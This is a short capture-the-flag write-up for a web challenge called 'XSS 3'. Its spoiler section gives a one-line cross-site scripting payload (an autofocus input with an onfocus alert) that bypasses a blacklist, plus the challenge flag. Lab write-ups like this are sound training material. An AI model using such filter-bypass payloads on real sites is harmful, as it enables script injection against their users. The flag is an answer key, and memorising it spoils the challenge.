# XSS 3

## Authors

- Daniel Cooper

## Category

- web

## Description

Did you cheese the last one? I've patched it.

[https://xss3.ctf.secso.cc/](https://xss3.ctf.secso.cc/)

Author: @ssparrow

## Hints

## Files

## Solution

<details>
<summary>Spoiler</summary>

### Idea

Bypass a stricter blacklist.

### Walkthrough

This time we can use the following payload to get XSS:

```
<input onfocus=alert(1) autofocus>
```

Note: you will need to reload the page to get this to work

### Flag

`SPOOKTF{st0p_bypass1ng_my_protection5!!}`

</details>
